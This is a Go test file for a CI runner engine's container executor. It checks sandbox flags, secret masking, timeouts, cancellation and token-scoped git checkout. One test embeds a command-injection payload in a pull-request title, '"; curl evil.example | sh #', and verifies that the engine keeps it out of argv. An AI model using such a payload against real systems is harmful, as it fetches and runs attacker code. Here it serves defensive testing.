// SPDX-License-Identifier: AGPL-3.0-or-later

package engine

import (
	"context"
	"errors"
	"io"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"
)

type recordingRunner struct {
	name string
	args []string
	env  []string
	err  error
}

func (r *recordingRunner) Run(_ context.Context, name string, args []string, env []string, _, _ io.Writer) error {
	r.name = name
	r.args = append([]string{}, args...)
	r.env = append([]string{}, env...)
	return r.err
}

type loggingRunner struct{}

func (loggingRunner) Run(_ context.Context, _ string, _ []string, _ []string, stdout, stderr io.Writer) error {
	_, _ = stdout.Write([]byte("hello "))
	_, _ = stderr.Write([]byte("world\n"))
	return nil
}

type secretLoggingRunner struct{}

func (secretLoggingRunner) Run(_ context.Context, _ string, _ []string, _ []string, stdout, _ io.Writer) error {
	_, _ = stdout.Write([]byte("hun"))
	_, _ = stdout.Write([]byte("ter2\n"))
	return nil
}

type cancellableRunner struct {
	started  chan struct{}
	killed   chan struct{}
	killArgs []string
	mu       sync.Mutex
}

func newCancellableRunner() *cancellableRunner {
	return &cancellableRunner{
		started: make(chan struct{}),
		killed:  make(chan struct{}),
	}
}

func (r *cancellableRunner) Run(ctx context.Context, _ string, args []string, _ []string, _, _ io.Writer) error {
	if len(args) > 0 && args[0] == "kill" {
		r.mu.Lock()
		r.killArgs = append([]string{}, args...)
		r.mu.Unlock()
		close(r.killed)
		return nil
	}
	close(r.started)
	select {
	case <-r.killed:
		return context.Canceled
	case <-ctx.Done():
		return ctx.Err()
	}
}

type timeoutRunner struct {
	started   chan struct{}
	killed    chan struct{}
	killArgs  []string
	startOnce sync.Once
	killOnce  sync.Once
	mu        sync.Mutex
}

func newTimeoutRunner() *timeoutRunner {
	return &timeoutRunner{
		started: make(chan struct{}),
		killed:  make(chan struct{}),
	}
}

func (r *timeoutRunner) Run(ctx context.Context, _ string, args []string, _ []string, _, _ io.Writer) error {
	if len(args) > 0 && args[0] == "kill" {
		r.mu.Lock()
		r.killArgs = append([]string{}, args...)
		r.mu.Unlock()
		r.killOnce.Do(func() { close(r.killed) })
		return nil
	}
	r.startOnce.Do(func() { close(r.started) })
	<-ctx.Done()
	return ctx.Err()
}

func TestDockerExecute_BuildsResourceCappedRunCommand(t *testing.T) {
	t.Parallel()
	rec := &recordingRunner{}
	d := NewDocker(DockerConfig{
		Binary:       "podman",
		DefaultImage: "runner-image",
		Network:      "none",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       rec,
	})
	out, err := d.Execute(t.Context(), Job{
		ID:           1,
		RunID:        2,
		WorkspaceDir: t.TempDir(),
		Env:          map[string]string{"A": "job"},
		Steps: []Step{{
			Index:            0,
			Name:             "test",
			Run:              "echo hi",
			WorkingDirectory: "subdir",
			Env:              map[string]string{"B": "step"},
		}},
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if out.Conclusion != ConclusionSuccess {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
	want := []string{
		"run", "--rm", "--name", "shithub-job-1-step-0",
		"--network=none", "--memory=2g", "--cpus=2",
		"--pids-limit=512", "--read-only",
		"--tmpfs", "/tmp:rw,exec,nosuid,nodev,size=1g",
		"--cap-drop=ALL", "--cap-add=DAC_OVERRIDE", "--cap-add=SETGID", "--cap-add=SETUID",
		"--security-opt=no-new-privileges", "--security-opt=seccomp=/etc/shithubd-runner/seccomp.json",
		"--ulimit", "nofile=4096:4096", "--ulimit", "nproc=512:512",
		"--user", "65534:65534",
		"--workdir=/workspace/subdir",
		"--mount", rec.args[25],
		"--env", "A", "--env", "B",
		"runner-image", "bash", "-c", "echo hi",
	}
	if rec.name != "podman" {
		t.Fatalf("name: %s", rec.name)
	}
	if !reflect.DeepEqual(rec.args, want) {
		t.Fatalf("args:\ngot  %#v\nwant %#v", rec.args, want)
	}
	if !strings.HasPrefix(rec.args[25], "type=bind,src=") || !strings.HasSuffix(rec.args[25], ",dst=/workspace") || strings.Contains(rec.args[25], ",rw") {
		t.Fatalf("workspace mount arg: %q", rec.args[25])
	}
	if wantEnv := []string{"A=job", "B=step"}; !reflect.DeepEqual(rec.env, wantEnv) {
		t.Fatalf("env:\ngot  %#v\nwant %#v", rec.env, wantEnv)
	}
}

func TestDockerExecute_RendersTaintedExpressionsThroughInputEnv(t *testing.T) {
	t.Parallel()
	rec := &recordingRunner{}
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "bridge",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       rec,
	})
	malicious := `"; curl evil.example | sh #`
	if _, err := d.Execute(t.Context(), Job{
		ID:           1,
		RunID:        2,
		HeadSHA:      "abc",
		HeadRef:      "refs/heads/trunk",
		EventPayload: map[string]any{"pull_request": map[string]any{"title": malicious}},
		WorkspaceDir: t.TempDir(),
		Steps: []Step{{
			Run: `echo "${{ shithub.event.pull_request.title }}"`,
		}},
	}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if got := rec.args[len(rec.args)-1]; got != `echo "${SHITHUB_INPUT_0}"` {
		t.Fatalf("rendered command: %q", got)
	}
	if !containsFlagValue(rec.args, "--env", "SHITHUB_INPUT_0") {
		t.Fatalf("input binding missing from args: %#v", rec.args)
	}
	if containsSubstring(rec.args, malicious) {
		t.Fatalf("tainted input leaked into argv: %#v", rec.args)
	}
	if !containsEnv(rec.env, "SHITHUB_INPUT_0="+malicious) {
		t.Fatalf("input binding missing from process env: %#v", rec.env)
	}
}

func TestDockerExecute_RendersSecretsThroughEnvWithoutArgvLeak(t *testing.T) {
	t.Parallel()
	rec := &recordingRunner{}
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "bridge",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       rec,
	})
	const secret = "hunter2"
	if _, err := d.Execute(t.Context(), Job{
		ID:           1,
		RunID:        2,
		Secrets:      map[string]string{"TOKEN": secret},
		WorkspaceDir: t.TempDir(),
		Steps: []Step{{
			Run: `printf '%s\n' "${{ secrets.TOKEN }}"`,
		}},
	}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if got := rec.args[len(rec.args)-1]; got != `printf '%s\n' "${SHITHUB_INPUT_0}"` {
		t.Fatalf("rendered command: %q", got)
	}
	if !containsFlagValue(rec.args, "--env", "SHITHUB_INPUT_0") {
		t.Fatalf("secret binding missing from args: %#v", rec.args)
	}
	if containsSubstring(rec.args, secret) {
		t.Fatalf("secret leaked into argv: %#v", rec.args)
	}
	if !containsEnv(rec.env, "SHITHUB_INPUT_0="+secret) {
		t.Fatalf("secret binding missing from process env: %#v", rec.env)
	}
}

func TestDockerExecute_RootRequiresExplicitPermission(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		name        string
		permissions string
		wantUser    string
	}{
		{name: "default", permissions: `{}`, wantUser: "65534:65534"},
		{name: "write-all-does-not-root", permissions: `{"mode":"write-all"}`, wantUser: "65534:65534"},
		{name: "explicit-root-disabled-by-default", permissions: `{"per":{"shithub-runner-root":"write"}}`, wantUser: "65534:65534"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			rec := &recordingRunner{}
			d := NewDocker(DockerConfig{
				DefaultImage: "runner-image",
				Network:      "bridge",
				Memory:       "2g",
				CPUs:         "2",
				Runner:       rec,
			})
			if _, err := d.Execute(t.Context(), Job{
				ID:           1,
				Permissions:  []byte(tc.permissions),
				WorkspaceDir: t.TempDir(),
				Steps:        []Step{{Run: "id -u"}},
			}); err != nil {
				t.Fatalf("Execute: %v", err)
			}
			if got := argAfter(rec.args, "--user"); got != tc.wantUser {
				t.Fatalf("--user: got %q want %q in %#v", got, tc.wantUser, rec.args)
			}
		})
	}
}

func TestDockerExecute_AllowRootEnablesExplicitRootPermission(t *testing.T) {
	t.Parallel()
	rec := &recordingRunner{}
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "bridge",
		Memory:       "2g",
		CPUs:         "2",
		AllowRoot:    true,
		Runner:       rec,
	})
	if _, err := d.Execute(t.Context(), Job{
		ID:           1,
		Permissions:  []byte(`{"per":{"shithub-runner-root":"write"}}`),
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{Run: "id -u"}},
	}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if got := argAfter(rec.args, "--user"); got != "0:0" {
		t.Fatalf("--user: got %q want %q in %#v", got, "0:0", rec.args)
	}
}

func TestDockerExecute_AddsConfiguredDNSServers(t *testing.T) {
	t.Parallel()
	rec := &recordingRunner{}
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "actions-net",
		Memory:       "2g",
		CPUs:         "2",
		DNSServers:   []string{"172.30.0.10", "172.30.0.11"},
		Runner:       rec,
	})
	if _, err := d.Execute(t.Context(), Job{
		ID:           1,
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{Run: "curl https://github.com"}},
	}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if argAfterN(rec.args, "--dns", 0) != "172.30.0.10" || argAfterN(rec.args, "--dns", 1) != "172.30.0.11" {
		t.Fatalf("dns args missing: %#v", rec.args)
	}
}

func TestDockerExecute_StreamsStepLogs(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{
		DefaultImage:  "runner-image",
		Network:       "bridge",
		Memory:        "2g",
		CPUs:          "2",
		LogChunkBytes: 4,
		Runner:        loggingRunner{},
	})
	logs, err := d.StreamLogs(t.Context(), 99)
	if err != nil {
		t.Fatalf("StreamLogs: %v", err)
	}
	out, err := d.Execute(t.Context(), Job{
		ID:           99,
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{ID: 123, Run: "echo hi"}},
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if len(out.StepOutcomes) != 1 || out.StepOutcomes[0].StepID != 123 {
		t.Fatalf("StepOutcomes: %#v", out.StepOutcomes)
	}
	var got []LogChunk
	for chunk := range logs {
		got = append(got, chunk)
	}
	if len(got) == 0 {
		t.Fatal("no log chunks streamed")
	}
	if got[0].JobID != 99 || got[0].StepID != 123 || got[0].Seq != 0 {
		t.Fatalf("first chunk: %#v", got[0])
	}
}

func TestDockerExecute_ScrubsStepLogsAcrossChunkBoundary(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{
		DefaultImage:  "runner-image",
		Network:       "bridge",
		Memory:        "2g",
		CPUs:          "2",
		LogChunkBytes: 3,
		Runner:        secretLoggingRunner{},
	})
	logs, err := d.StreamLogs(t.Context(), 99)
	if err != nil {
		t.Fatalf("StreamLogs: %v", err)
	}
	if _, err := d.Execute(t.Context(), Job{
		ID:           99,
		WorkspaceDir: t.TempDir(),
		MaskValues:   []string{"hunter2"},
		Steps:        []Step{{ID: 123, Run: "echo secret"}},
	}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	var got string
	for chunk := range logs {
		got += string(chunk.Chunk)
	}
	if got != "***\n" {
		t.Fatalf("logs: %q", got)
	}
}

func TestDockerExecute_StreamsOrderedEvents(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{
		DefaultImage:     "runner-image",
		Network:          "bridge",
		Memory:           "2g",
		CPUs:             "2",
		LogFlushInterval: time.Hour,
		Runner:           loggingRunner{},
	})
	events, err := d.StreamEvents(t.Context(), 99)
	if err != nil {
		t.Fatalf("StreamEvents: %v", err)
	}
	if _, err := d.Execute(t.Context(), Job{
		ID:           99,
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{ID: 123, Run: "echo hi"}},
	}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	var got []Event
	for event := range events {
		got = append(got, event)
	}
	if len(got) != 2 {
		t.Fatalf("events: %#v", got)
	}
	if got[0].Log == nil || string(got[0].Log.Chunk) != "hello world\n" {
		t.Fatalf("first event: %#v", got[0])
	}
	if got[1].Step == nil || got[1].Step.StepID != 123 || got[1].Step.Conclusion != ConclusionSuccess {
		t.Fatalf("second event: %#v", got[1])
	}
}

func TestDockerCancelKillsActiveContainer(t *testing.T) {
	t.Parallel()
	rec := newCancellableRunner()
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "bridge",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       rec,
	})
	type executeResult struct {
		out Outcome
		err error
	}
	done := make(chan executeResult, 1)
	go func() {
		out, err := d.Execute(t.Context(), Job{
			ID:           99,
			WorkspaceDir: t.TempDir(),
			Steps:        []Step{{ID: 123, Run: "sleep 600"}},
		})
		done <- executeResult{out: out, err: err}
	}()
	<-rec.started
	if err := d.Cancel(t.Context(), 99); err != nil {
		t.Fatalf("Cancel: %v", err)
	}
	res := <-done
	if !errors.Is(res.err, context.Canceled) {
		t.Fatalf("Execute error: %v", res.err)
	}
	if res.out.Conclusion != ConclusionCancelled {
		t.Fatalf("Conclusion: %q", res.out.Conclusion)
	}
	rec.mu.Lock()
	killArgs := append([]string{}, rec.killArgs...)
	rec.mu.Unlock()
	want := []string{"kill", "shithub-job-99-step-123"}
	if !reflect.DeepEqual(killArgs, want) {
		t.Fatalf("kill args: got %#v want %#v", killArgs, want)
	}
}

func TestDockerExecute_TimeoutKillsActiveContainerAndReportsTimedOut(t *testing.T) {
	t.Parallel()
	rec := newTimeoutRunner()
	d := NewDocker(DockerConfig{
		DefaultImage:     "runner-image",
		Network:          "bridge",
		Memory:           "2g",
		CPUs:             "2",
		Runner:           rec,
		TimeoutMinute:    time.Millisecond,
		LogChunkBytes:    4,
		StepLogLimit:     1024,
		LogFlushInterval: time.Hour,
	})
	events, err := d.StreamEvents(t.Context(), 99)
	if err != nil {
		t.Fatalf("StreamEvents: %v", err)
	}
	out, err := d.Execute(t.Context(), Job{
		ID:             99,
		TimeoutMinutes: 1,
		WorkspaceDir:   t.TempDir(),
		Steps:          []Step{{ID: 123, Run: "sleep 600", ContinueOnError: true}},
	})
	if !errors.Is(err, ErrJobTimedOut) {
		t.Fatalf("Execute error: got %v, want ErrJobTimedOut", err)
	}
	if out.Conclusion != ConclusionTimedOut {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
	if len(out.StepOutcomes) != 1 ||
		out.StepOutcomes[0].StepID != 123 ||
		out.StepOutcomes[0].Status != "completed" ||
		out.StepOutcomes[0].Conclusion != ConclusionTimedOut {
		t.Fatalf("StepOutcomes: %#v", out.StepOutcomes)
	}
	select {
	case <-rec.killed:
	case <-time.After(time.Second):
		t.Fatal("timeout did not kill active container")
	}
	rec.mu.Lock()
	killArgs := append([]string{}, rec.killArgs...)
	rec.mu.Unlock()
	want := []string{"kill", "shithub-job-99-step-123"}
	if !reflect.DeepEqual(killArgs, want) {
		t.Fatalf("kill args: got %#v want %#v", killArgs, want)
	}
	var got []Event
	for event := range events {
		got = append(got, event)
	}
	if len(got) != 1 || got[0].Step == nil || got[0].Step.Conclusion != ConclusionTimedOut {
		t.Fatalf("timeout step event: %#v", got)
	}
}

func TestDockerExecute_FailureMapsToFailureConclusion(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "bridge",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       &recordingRunner{err: errors.New("exit 1")},
	})
	out, err := d.Execute(t.Context(), Job{
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{Run: "exit 1"}},
	})
	if err == nil {
		t.Fatal("Execute returned nil error")
	}
	if out.Conclusion != ConclusionFailure {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
}

func TestDockerExecute_ContinueOnErrorContinues(t *testing.T) {
	t.Parallel()
	rec := &recordingRunner{err: errors.New("exit 1")}
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "bridge",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       rec,
	})
	out, err := d.Execute(t.Context(), Job{
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{Run: "exit 1", ContinueOnError: true}},
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if out.Conclusion != ConclusionSuccess {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
}

func TestDockerExecute_RejectsUnsupportedUses(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{DefaultImage: "runner-image", Network: "bridge", Memory: "2g", CPUs: "2", Runner: &recordingRunner{}})
	out, err := d.Execute(t.Context(), Job{
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{Uses: "shithub/upload-artifact@v1"}},
	})
	if !errors.Is(err, ErrUnsupportedUses) {
		t.Fatalf("error: %v", err)
	}
	if out.Conclusion != ConclusionFailure {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
}

type checkoutRunner struct {
	calls           []checkoutCall
	failFetchTarget string
}

type checkoutCall struct {
	name string
	args []string
	env  []string
}

func (r *checkoutRunner) Run(_ context.Context, name string, args []string, env []string, stdout, _ io.Writer) error {
	r.calls = append(r.calls, checkoutCall{
		name: name,
		args: append([]string{}, args...),
		env:  append([]string{}, env...),
	})
	if r.failFetchTarget != "" && len(args) >= 2 && args[len(args)-2] == "origin" && args[len(args)-1] == r.failFetchTarget {
		return errors.New("server does not allow request for unadvertised object")
	}
	if len(args) >= 4 && args[len(args)-2] == "rev-parse" && args[len(args)-1] == "HEAD" {
		_, _ = stdout.Write([]byte("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"))
	}
	return nil
}

func TestDockerExecute_CheckoutUsesScopedCredentialAndVerifiesHead(t *testing.T) {
	t.Parallel()
	rec := &checkoutRunner{}
	d := NewDocker(DockerConfig{
		GitBinary:     "git-test",
		DefaultImage:  "runner-image",
		Network:       "bridge",
		Memory:        "2g",
		CPUs:          "2",
		LogChunkBytes: 1024,
		Runner:        rec,
	})
	out, err := d.Execute(t.Context(), Job{
		ID:            1,
		RunID:         2,
		CheckoutURL:   "https://shithub.test/alice/demo.git",
		CheckoutToken: "checkout-token",
		HeadSHA:       "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		HeadRef:       "refs/heads/trunk",
		WorkspaceDir:  t.TempDir(),
		Steps: []Step{{
			ID:   10,
			Uses: "actions/checkout@v4",
			With: map[string]string{"fetch-depth": "0"},
		}},
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if out.Conclusion != ConclusionSuccess {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
	if len(rec.calls) != 5 {
		t.Fatalf("git calls: got %d want 5: %#v", len(rec.calls), rec.calls)
	}
	want := [][]string{
		{"-C", rec.calls[0].args[1], "init"},
		{"-C", rec.calls[1].args[1], "remote", "add", "origin", "https://shithub.test/alice/demo.git"},
		{"-C", rec.calls[2].args[1], "-c", rec.calls[2].args[3], "fetch", "--no-tags", "origin", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
		{"-C", rec.calls[3].args[1], "checkout", "--force", "--detach", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
		{"-C", rec.calls[4].args[1], "rev-parse", "HEAD"},
	}
	for i := range want {
		if rec.calls[i].name != "git-test" {
			t.Fatalf("call %d name = %q", i, rec.calls[i].name)
		}
		if !reflect.DeepEqual(rec.calls[i].args, want[i]) {
			t.Fatalf("call %d args:\ngot  %#v\nwant %#v", i, rec.calls[i].args, want[i])
		}
	}
	if strings.Contains(strings.Join(rec.calls[2].args, " "), "checkout-token") {
		t.Fatalf("checkout token leaked into argv: %#v", rec.calls[2].args)
	}
	if !containsEnv(rec.calls[2].env, "SHITHUB_CHECKOUT_TOKEN=checkout-token") {
		t.Fatalf("checkout token missing from git env: %#v", rec.calls[2].env)
	}
	if rec.calls[2].args[3] != `credential.helper=!f() { echo username=shithub-actions; echo password=$SHITHUB_CHECKOUT_TOKEN; }; f` {
		t.Fatalf("credential helper: %q", rec.calls[2].args[3])
	}
}

func TestDockerExecute_CheckoutFallsBackToHeadRefWhenExactSHAIsUnadvertised(t *testing.T) {
	t.Parallel()
	rec := &checkoutRunner{failFetchTarget: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
	d := NewDocker(DockerConfig{
		GitBinary:     "git-test",
		DefaultImage:  "runner-image",
		Network:       "bridge",
		Memory:        "2g",
		CPUs:          "2",
		LogChunkBytes: 1024,
		Runner:        rec,
	})
	out, err := d.Execute(t.Context(), Job{
		ID:            1,
		RunID:         2,
		CheckoutURL:   "https://shithub.test/alice/demo.git",
		CheckoutToken: "checkout-token",
		HeadSHA:       "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		HeadRef:       "refs/heads/trunk",
		WorkspaceDir:  t.TempDir(),
		Steps: []Step{{
			ID:   10,
			Uses: "actions/checkout@v4",
		}},
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if out.Conclusion != ConclusionSuccess {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
	if len(rec.calls) != 6 {
		t.Fatalf("git calls: got %d want 6: %#v", len(rec.calls), rec.calls)
	}
	wantFetch := []string{"-C", rec.calls[2].args[1], "-c", rec.calls[2].args[3], "fetch", "--no-tags", "--depth=1", "origin", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
	if !reflect.DeepEqual(rec.calls[2].args, wantFetch) {
		t.Fatalf("exact fetch args:\ngot  %#v\nwant %#v", rec.calls[2].args, wantFetch)
	}
	wantFallback := []string{"-C", rec.calls[3].args[1], "-c", rec.calls[3].args[3], "fetch", "--no-tags", "origin", "refs/heads/trunk"}
	if !reflect.DeepEqual(rec.calls[3].args, wantFallback) {
		t.Fatalf("fallback fetch args:\ngot  %#v\nwant %#v", rec.calls[3].args, wantFallback)
	}
}

func TestCheckoutDepthArgsRejectsUnsupportedInputs(t *testing.T) {
	t.Parallel()
	if _, err := checkoutDepthArgs(map[string]string{"path": "src"}); err == nil || !strings.Contains(err.Error(), `unsupported checkout input "path"`) {
		t.Fatalf("checkoutDepthArgs error = %v", err)
	}
}

func TestCheckoutFallbackRef(t *testing.T) {
	t.Parallel()
	for _, ref := range []string{"refs/heads/trunk", "refs/heads/feature/x", "refs/tags/v1.0.0"} {
		got, ok := checkoutFallbackRef(ref)
		if !ok || got != ref {
			t.Fatalf("checkoutFallbackRef(%q) = %q, %t", ref, got, ok)
		}
	}
	for _, ref := range []string{"", "trunk", "refs/pull/1/head", "refs/heads/../x", "refs/heads/a b", "refs/heads/a:b", "refs/heads/x.lock"} {
		if got, ok := checkoutFallbackRef(ref); ok {
			t.Fatalf("checkoutFallbackRef(%q) = %q, true", ref, got)
		}
	}
}

func TestContainerWorkdirRejectsEscapes(t *testing.T) {
	t.Parallel()
	for _, wd := range []string{"../x", "/tmp"} {
		if _, err := containerWorkdir(wd); err == nil {
			t.Fatalf("containerWorkdir(%q) returned nil error", wd)
		}
	}
}

func containsFlagValue(args []string, flag, value string) bool {
	for i, arg := range args {
		if arg == flag && i+1 < len(args) && args[i+1] == value {
			return true
		}
	}
	return false
}

func containsSubstring(args []string, substr string) bool {
	for _, arg := range args {
		if strings.Contains(arg, substr) {
			return true
		}
	}
	return false
}

func containsEnv(env []string, want string) bool {
	for _, item := range env {
		if item == want {
			return true
		}
	}
	return false
}

func argAfter(args []string, flag string) string {
	for i, arg := range args {
		if arg == flag && i+1 < len(args) {
			return args[i+1]
		}
	}
	return ""
}

func argAfterN(args []string, flag string, n int) string {
	for i, arg := range args {
		if arg == flag {
			if n == 0 && i+1 < len(args) {
				return args[i+1]
			}
			n--
		}
	}
	return ""
}
